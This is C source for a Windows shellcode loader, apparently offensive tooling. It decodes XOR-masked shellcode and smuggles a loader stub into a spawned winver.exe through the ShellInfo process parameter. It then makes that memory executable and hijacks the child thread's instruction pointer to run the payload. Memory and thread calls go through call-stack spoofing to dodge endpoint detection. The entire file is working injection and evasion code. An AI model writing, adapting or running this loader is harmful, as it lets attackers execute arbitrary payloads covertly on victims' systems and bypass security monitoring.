#include <windows.h>
#include <stdint.h>

#include "native.h"

#include "tcg.h"
#include "dfr.h"
#include "utils.h"
#include "shellwriter.h"
#include "spoof.h"

char __SC__  [0] __attribute__((section("sc")));
char __MASK__[0] __attribute__((section("mask")));

void go()
{
    dprintf("[+] Loader running...\n");

    init_spoof();
    dprintf("[+] init_spoof: alloc=0x%llx gadget=0x%llx\n",
            g_alloc_size, g_spoof_gadget);

    /* ── Unmask shellcode ──────────────────────────────────────────── */
    RESOURCE *masked_sc = (RESOURCE *)GETRESOURCE(__SC__);
    RESOURCE *mask_key  = (RESOURCE *)GETRESOURCE(__MASK__);

    char unmasked_sc[masked_sc->length];
    for (int i = 0; i < masked_sc->length; i++)
        unmasked_sc[i] = masked_sc->value[i] ^ mask_key->value[i % mask_key->length];

    /* ── Build ShellCodeWriter stub ────────────────────────────────── */
    u8 stub[SCW_BUF_LARGE];
    int _i; for (_i = 0; _i < SCW_BUF_LARGE; _i++) stub[_i] = 0;

    SCW w;
    scw_init(&w, stub, sizeof(stub));
    scw_load_and_call(&w,
                      (u64)KERNEL32$VirtualAlloc,
                      (u64)KERNEL32$VirtualProtect,
                      (const u8 *)unmasked_sc, masked_sc->length);

    dprintf("[+] ShellWriter stub: %d bytes, nulls: %s\n",
            w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");

    /* ── Spawn winver.exe via NtCreateUserProcess ──────────────────── */
    wchar_t ntPath[] = {
        L'\\',L'?',L'?',L'\\',
        L'C',L':',L'\\',
        L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',
        L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',
        L'w',L'i',L'n',L'v',L'e',L'r',L'.',L'e',L'x',L'e',
        L'\0'};

    UNICODE_STRING imagePath;
    imagePath.Buffer        = ntPath;
    imagePath.Length        = (USHORT)(sizeof(ntPath) - sizeof(wchar_t));
    imagePath.MaximumLength = sizeof(ntPath);

    /* ShellInfo carries the stub — no null-termination scan */
    UNICODE_STRING shellInfoStr;
    shellInfoStr.Buffer        = (PWSTR)stub;
    shellInfoStr.Length        = (USHORT)w.len;
    shellInfoStr.MaximumLength = (USHORT)sizeof(stub);

    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
    NTSTATUS status = 0;

    status = NTDLL$RtlCreateProcessParametersEx(
        &procParams,
        &imagePath,    /* ImagePathName  */
        NULL,          /* DllPath        */
        NULL,          /* CurrentDir     */
        NULL,          /* CommandLine    */
        NULL,          /* Environment    */
        NULL,          /* WindowTitle    */
        NULL,          /* DesktopInfo    */
        &shellInfoStr, /* ShellInfo ← stub placed here */
        NULL,          /* RuntimeData    */
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    if (!NT_SUCCESS(status)) {
        dprintf("[-] RtlCreateProcessParametersEx: 0x%X\n", status);
        return;
    }

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(PS_CREATE_INFO);

    PS_ATTRIBUTE_LIST attrList = {0};
    attrList.TotalLength              = sizeof(PS_ATTRIBUTE_LIST);
    attrList.Attributes[0].Attribute  = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size       = imagePath.Length;
    attrList.Attributes[0].ValuePtr   = imagePath.Buffer;
    attrList.Attributes[0].ReturnLength = NULL;

    HANDLE hProcess = NULL, hThread = NULL;

    status = NTDLL$NtCreateUserProcess(
        &hProcess, &hThread,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        NULL, NULL, 0, 0,
        procParams, &createInfo, &attrList);

    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtCreateUserProcess: 0x%X\n", status);
        return;
    }

    /* Give the child time to initialise before walking its PEB */
    LARGE_INTEGER delay;
    delay.QuadPart = -2000000LL;
    NTDLL$NtDelayExecution(FALSE, &delay);

    NTDLL$RtlDestroyProcessParameters(procParams);

    /* ── Read child PEB → ProcessParameters → ShellInfo.Buffer ────── */
    PROCESS_BASIC_INFORMATION pbi = {0};
    DWORD  retLen    = 0;
    SIZE_T bytesRead = 0;

    NTDLL$NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
    dprintf("[+] Process created PID: %llu\n", pbi.UniqueProcessId);

    PEB pebLocal = {0};
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtReadVirtualMemory,
        (u64)hProcess, (u64)pbi.PebBaseAddress,
        (u64)&pebLocal, (u64)sizeof(pebLocal), (u64)&bytesRead,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtReadVirtualMemory (PEB): 0x%X\n", status);
        return;
    }

    RTL_USER_PROCESS_PARAMETERS parameters = {0};
    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtReadVirtualMemory,
        (u64)hProcess, (u64)pebLocal.ProcessParameters,
        (u64)&parameters, (u64)sizeof(parameters), (u64)&bytesRead,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtReadVirtualMemory (ProcessParameters): 0x%X\n", status);
        return;
    }

    /* ── Make shellcode page executable ───────────────────────────── */
    PVOID     shellcode     = (PVOID)parameters.ShellInfo.Buffer;
    ULONG_PTR unaligned     = (ULONG_PTR)shellcode;
    ULONG_PTR aligned       = unaligned & ~(4096 - 1);
    PVOID     base          = (PVOID)aligned;
    SIZE_T    shellcodeSize = (SIZE_T)w.len + (unaligned - aligned);
    ULONG     oldp          = 0;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtProtectVirtualMemory,
        (u64)hProcess, (u64)&base,
        (u64)&shellcodeSize, (u64)PAGE_EXECUTE_READ, (u64)&oldp,
        0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtProtectVirtualMemory: 0x%X\n", status);
        return;
    }

    /* ── Hijack child thread RIP → shellcode ───────────────────────── */
    static CONTEXT ctx_storage;
    CONTEXT *ctx = &ctx_storage;
    for (int _z = 0; _z < (int)sizeof(CONTEXT); _z++) ((u8 *)ctx)[_z] = 0;
    ctx->ContextFlags = CONTEXT_CONTROL;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtGetContextThread,
        (u64)hThread, (u64)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtGetContextThread: 0x%X\n", status);
        return;
    }

    ctx->Rip = (DWORD64)shellcode;

    status = (NTSTATUS)spoof_call(
        (u64)NTDLL$NtSetContextThread,
        (u64)hThread, (u64)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtSetContextThread: 0x%X\n", status);
        return;
    }

    dprintf("[+] RIP hijacked → shellcode executing\n");

    /* ── Wait for child thread, then clean up ──────────────────────── */
    LARGE_INTEGER wait_timeout;
    wait_timeout.QuadPart = -10000000LL;
    NTDLL$NtWaitForSingleObject(hThread, FALSE, &wait_timeout);

    NTDLL$NtClose(hThread);
    NTDLL$NtClose(hProcess);

    dprintf("[+] === EXIT LOADER ===\n");
}